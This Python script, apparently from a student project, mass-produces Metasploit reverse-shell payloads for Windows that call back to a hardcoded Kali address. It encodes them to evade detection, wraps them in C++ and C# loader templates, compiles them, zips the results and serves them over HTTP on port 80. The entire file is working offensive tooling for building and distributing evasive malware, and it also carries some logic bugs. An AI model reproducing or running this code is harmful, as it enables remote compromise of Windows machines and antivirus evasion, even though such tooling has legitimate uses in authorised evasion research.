import subprocess
import os
import shutil

# ip address of the kali
attacker_ip = "192.168.56.140"
port = "443"

payload = [
    "windows/x64/meterpreter/reverse_tcp",
    "windows/x64/meterpreter_reverse_tcp",
    "windows/x64/meterpreter_reverse_http",
    "windows/x64/meterpreter_reverse_https",
    "windows/x64/meterpreter/reverse_http",
    "windows/x64/meterpreter/reverse_https",
    "windows/x64/shell/reverse_tcp",
    "windows/x64/shell_reverse_tcp",
]


current_path = os.getcwd()
temp = current_path + "/temp/"
result_list = []

# generate self sign ssl
print("[*] Generating Self-Sign certificate")
os.system(
    'openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.evil.com" -keyout www.evil.com.key -out www.evil.com.crt && cat www.evil.com.key www.evil.com.crt > www.evil.com.pem && rm -f www.evil.com.key  www.evil.com.crt'
)
print("[*] Saved into'www.evil.com.pem'")


def genreate_cpp_payload(payload, counter, file):
    for i in payload:
        counter += 1
        if "https" in payload:
            msfvenom_command = [
                "msfvenom",
                "-p",
                i,
                "LHOST=" + attacker_ip,
                "LPORT=" + port,
                "EXITFUNC=thread",
                "HandlerSSLCert=/home/kali/Desktop/msc_project/www.evil.com.pem",
                "StagerVerifySSLCert=true",
                "-f",
                "c",
                "-b",
                "\\x00\\x0a\\x0d\\x20\\xf4\\x41",
            ]
        else:
            msfvenom_command = [
                "msfvenom",
                "-p",
                i,
                "LHOST=" + attacker_ip,
                "LPORT=" + port,
                "EXITFUNC=thread",
                "-f",
                "c",
                "-b",
                "\\x00\\x0a\\x0d\\x20\\xf4\\x41",
            ]

        print(msfvenom_command)
        file.writelines(str(msfvenom_command) + "\n")
        result = subprocess.run(msfvenom_command, stdout=subprocess.PIPE)
        result = result.stdout.decode("utf-8")
        cs_file = inject_payload_template(
            result, template_path=current_path + "/cpp_loader_template.cpp"
        )
        filename = temp + "payload_" + str(counter)
        fs = open(filename + ".cpp", "w")
        fs.write(cs_file)
        fs.close()

        # compile
        compile_command = (
            "i686-w64-mingw32-gcc -I /usr/x86_64-w64-mingw32/include "
            + filename
            + ".cpp -o "
            + filename
            + ".exe"
        )
        # print(compile_command)
        # os.system(compile_command)
        # csv format
        # number,payload type, file,  result,

        result_list.append(
            str(counter)
            + ","
            + i
            + ","
            + filename
            + ".exe"
            + ",0,XOR_x64,NA,"
            + "".join([str(item) for item in msfvenom_command])
        )

    for i in payload:
        counter += 1
        if "https" in payload:
            msfvenom_command = [
                "msfvenom",
                "-p",
                i,
                "LHOST=" + attacker_ip,
                "LPORT=" + port,
                "EXITFUNC=thread",
                "HandlerSSLCert=/home/kali/Desktop/msc_project/www.evil.com.pem",
                "StagerVerifySSLCert=true",
                "-f",
                "c",
                "-e",
                "x86/shikata_ga_nai",
                "-i",
                "5",
            ]
        else:
            msfvenom_command = [
                "msfvenom",
                "-p",
                i,
                "LHOST=" + attacker_ip,
                "LPORT=" + port,
                "EXITFUNC=thread",
                "-f",
                "c",
                "-e",
                "x86/shikata_ga_nai",
                "-i",
                "5",
            ]
        print(msfvenom_command)
        file.writelines(str(msfvenom_command) + "\n")
        result = subprocess.run(msfvenom_command, stdout=subprocess.PIPE)
        result = result.stdout.decode("utf-8")
        cs_file = inject_payload_template(
            result, template_path=current_path + "/cpp_loader_template.cpp"
        )
        filename = temp + "payload_" + str(counter)
        fs = open(filename + ".cpp", "w")
        fs.write(cs_file)
        fs.close()
        compile_command = (
            "i686-w64-mingw32-gcc -I /usr/x86_64-w64-mingw32/include "
            + filename
            + ".cpp -o "
            + filename
            + ".exe"
        )
        # print(compile_command)
        # os.system(compile_command)
        # csv format
        # number,payload type, file, result,encoder, comment,command,
        # ''.join([str(item) for item in msfvenom_command])
        result_list.append(
            str(counter)
            + ","
            + i
            + ","
            + filename
            + ".exe"
            + ",0,x86/shikata_ga_nai,NA,"
            + "".join([str(item) for item in msfvenom_command])
        )
    return counter


def genreate_csharp_payload(payload, counter, file):

    # x64/xor-64
    for i in payload:
        counter += 1
        if "https" in i:
            msfvenom_command = [
                "msfvenom",
                "-p",
                i,
                "LHOST=" + attacker_ip,
                "LPORT=" + port,
                "EXITFUNC=thread",
                "HandlerSSLCert=/home/kali/Desktop/msc_project/www.evil.com.pem",
                "StagerVerifySSLCert=true",
                "-f",
                "csharp",
                "-b",
                "\\x00\\x0a\\x0d\\x20\\xf4\\x41",
            ]
        else:
            msfvenom_command = [
                "msfvenom",
                "-p",
                i,
                "LHOST=" + attacker_ip,
                "LPORT=" + port,
                "EXITFUNC=thread",
                "-f",
                "csharp",
                "-b",
                "\\x00\\x0a\\x0d\\x20\\xf4\\x41",
            ]

        # generating source code
        file.writelines(str(msfvenom_command) + "\n")
        result = subprocess.run(msfvenom_command, stdout=subprocess.PIPE)
        result = result.stdout.decode("utf-8")
        cs_file = inject_payload_template(
            result, current_path + "/csharp_loader_template.cs"
        )
        print("[*] Using Template :" + current_path + "/csharp_loader_template.cs")

        source_code = temp + "payload_" + str(counter) + ".cs"

        # write into file
        fs = open(source_code, "w")
        fs.write(cs_file)
        fs.close()

        print("[*] Writing into source code into : " + source_code)
        output_name = "payload_" + str(counter) + ".exe"

        # compiling CSsharp
        print("[*] Compiling CSharp Source Code")
        print("[*] Command : " + "mcs -out:temp/" + output_name + " " + source_code)
        compile_command = "mcs -out:temp/" + output_name + " " + source_code
        stream = os.popen(compile_command)
        output = stream.read()

        # csv format
        # number,payload type, file,  result
        result_list.append(
            str(counter)
            + ","
            + i
            + ","
            + output_name
            + ",0,XOR_x64,NA,"
            + "".join([str(item) for item in msfvenom_command])
        )

    # shikata_ga_nai
    for i in payload:
        counter += 1
        if "https" in i:
            msfvenom_command = [
                "msfvenom",
                "-p",
                i,
                "LHOST=" + attacker_ip,
                "LPORT=" + port,
                "EXITFUNC=thread",
                "HandlerSSLCert=/home/kali/Desktop/msc_project/www.evil.com.pem",
                "StagerVerifySSLCert=true",
                "-f",
                "csharp",
                "-e",
                "x86/shikata_ga_nai",
                "-i",
                "5",
            ]

        else:
            msfvenom_command = [
                "msfvenom",
                "-p",
                i,
                "LHOST=" + attacker_ip,
                "LPORT=" + port,
                "EXITFUNC=thread",
                "-f",
                "csharp",
                "-e",
                "x86/shikata_ga_nai",
                "-i",
                "5",
            ]

        file.writelines(str(msfvenom_command) + "\n")
        result = subprocess.run(msfvenom_command, stdout=subprocess.PIPE)
        result = result.stdout.decode("utf-8")
        cs_file = inject_payload_template(
            result, current_path + "/csharp_loader_template.cs"
        )
        print("[*] Using Template :" + current_path + "/csharp_loader_template.cs")

        source_code = temp + "payload_" + str(counter) + ".cs"

        # write into file
        fs = open(source_code, "w")
        fs.write(cs_file)
        fs.close()

        print("[*] Writing into source code into : " + source_code)
        output_name = "payload_" + str(counter) + ".exe"

        # compiling CSsharp
        print("[*] Compiling CSharp Source Code")
        print("[*] Command : " + "mcs -out:temp/" + output_name + " " + source_code)
        compile_command = "mcs -out:temp/" + output_name + " " + source_code
        stream = os.popen(compile_command)
        output = stream.read()

        # csv format
        # number,payload type, file,  result
        result_list.append(
            str(counter)
            + ","
            + i
            + ","
            + output_name
            + ",0,x86/shikata_ga_nai,NA,"
            + "".join([str(item) for item in msfvenom_command])
        )
    return counter

def generate_exe_paylods(payload, counter, file):
    print('Directly generating exe files')
    os.chdir('temp')
    for i in payload:
        counter += 1
        filename = "payload_"+str(counter)+'.exe'
        msfvenom_command = [
            "msfvenom",
            "-p",
            i,
            "LHOST=" + attacker_ip,
            "LPORT=" + port,
            "EXITFUNC=thread",
            "-f",
            "exe",
            "-b",
            "\\x00\\x0a\\x0d\\x20\\xf4\\x41",
            "-o",
            filename 


        ]

        print(msfvenom_command)

        subprocess.run(msfvenom_command)
        # csv format
        # number,payload type, file,  result, 
        result_list.append(str(counter)+','+i+","+filename+',0,XOR_x64,NA,'+ ''.join([str(item) for item in msfvenom_command]))

    for i in payload:
        counter += 1
        filename = "payload_"+str(counter)+'.exe'
        msfvenom_command = [
            "msfvenom",
            "-p",
            i,
            "LHOST=" + attacker_ip,
            "LPORT=" + port,
            "EXITFUNC=thread",
            "-f",
            "exe",
            "x86/shikata_ga_nai",
            "-i",
            "5",
            "-o",
            filename 

        ]
        print(msfvenom_command)

        subprocess.run(msfvenom_command)
        # csv format
        # number,payload type, file,  result, 
        result_list.append(str(counter)+','+i+","+filename+',0,x86/shikata_ga_nai,NA,'+ ''.join([str(item) for item in msfvenom_command]))
        os.chdir('../')
        return counter


def genreate_msf_payloads(payload):
    """
    Executes a command constructed from a list of parameters using subprocess.

    :param params: List of strings representing the command and its arguments.
    :return: The output of the executed command.
    """
    try:

        with open("command.txt", "a") as file:
            csharp_counter = genreate_csharp_payload(payload, 0, file)
            cpp_counter = genreate_cpp_payload(payload, csharp_counter, file)
        os.chdir(current_path)
        file.close()

    except Exception as err:
        print(f"Unexpected {err=}, {type(err)=}")


def inject_payload_template(shell_code, template_path):
    template = open(template_path, "r").readlines()
    with open(template_path, "r") as f:
        content = f.read()
        f.close()

    content = content.replace("<shell_code>", shell_code)
    return content


def main():
    genreate_msf_payloads(payload)
    with open("output.csv", "w") as csv_file:
        csv_file.write("No,Payload_Type,Filename,Result,Encoder,Remark,Command+\n")
        for i in result_list:
            csv_file.write(i + "\n")
        csv_file.close()

    shutil.make_archive("payload", "zip", "temp")
    print("started web server on port 80")
    os.system("python -m http.server 80")


if __name__ == "__main__":
    main()
